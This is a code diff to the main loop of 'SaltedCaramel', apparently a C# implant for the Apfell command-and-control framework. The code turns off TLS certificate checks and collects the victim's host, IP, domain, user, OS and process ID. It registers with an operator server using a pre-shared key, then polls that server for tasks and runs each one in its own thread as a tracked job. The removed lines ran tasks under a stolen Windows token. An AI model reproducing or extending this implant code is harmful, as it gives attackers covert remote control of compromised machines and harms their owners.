@@ -1,9 +1,9 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
-using System.Security.Principal;
 using System.Threading;
 
 namespace SaltedCaramel
@@ -16,35 +16,47 @@ namespace SaltedCaramel
             ServicePointManager.ServerCertificateValidationCallback = 
                 delegate { return true; };
 
-            SCImplant implant = new SCImplant();
-            implant.uuid = args[2]; // Generated when payload is created in Apfell
-            implant.endpoint = args[0] + "/api/v1.3/";
-            implant.host = Dns.GetHostName();
-            implant.ip = Dns.GetHostEntry(implant.host) // Necessary because the host may have more than one interface
-                .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
-            implant.domain = Environment.UserDomainName;
-            implant.os = Environment.OSVersion.VersionString;
-            implant.architecture = "x64";
-            implant.pid = Process.GetCurrentProcess().Id;
-            implant.sleep = 5000;
-            implant.user = Environment.UserName;
+            SCImplant implant = new SCImplant()
+            {
+                uuid = args[2], // Generated when payload is created in Apfell
+                endpoint = args[0] + "/api/v1.3/",
+                host = Dns.GetHostName(),
+                ip = Dns.GetHostEntry(Dns.GetHostName()) // Necessary because the host may have more than one interface
+                    .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString(),
+                domain = Environment.UserDomainName,
+                os = Environment.OSVersion.VersionString,
+                architecture = "x64",
+                pid = Process.GetCurrentProcess().Id,
+                sleep = 5000,
+                user = Environment.UserName
+            };
             HTTP.crypto.PSK = Convert.FromBase64String(args[1]);
 
             if (implant.InitializeImplant())
             {
+                int shortId = 1;
                 while (true)
                 {
                     SCTaskObject task = implant.CheckTasking();
                     if (task.command != "none")
                     {
-                        if (implant.HasAlternateToken() == true)
+                        task.shortId = shortId;
+                        shortId++;
+
+                        Thread t = new Thread(() => task.DispatchTask(implant));
+                        t.Start();
+
+                        Job j = new Job
                         {
-                            using (WindowsIdentity ident = new WindowsIdentity(Tasks.Token.stolenHandle))
-                            using (WindowsImpersonationContext context = ident.Impersonate())
-                                task.DispatchTask(implant);
-                        }
-                        else
-                            ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
+                            shortId = task.shortId,
+                            task = task.command,
+                            thread = t
+                        };
+
+                        if (task.@params != "") j.task += " " + task.@params;
+
+                        implant.jobs.Add(j);
+
                     }
                     Thread.Sleep(implant.sleep);
                 }
